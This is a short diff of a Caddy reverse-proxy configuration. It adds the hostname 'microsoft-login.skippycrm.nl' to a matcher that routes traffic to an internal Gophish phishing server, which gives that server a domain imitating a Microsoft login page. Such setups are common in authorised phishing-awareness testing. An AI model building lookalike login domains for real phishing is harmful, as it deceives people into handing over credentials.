@@ -6,7 +6,7 @@
 }
 
 :80 {
-	@phish host phish.skippycrm.nl gophish.skippycrm.nl
+	@phish host phish.skippycrm.nl microsoft-login.skippycrm.nl
 	handle @phish {
 		reverse_proxy http://gophish-7493.railway.internal:80 {
 			header_up X-Forwarded-For {http.request.remote.host}
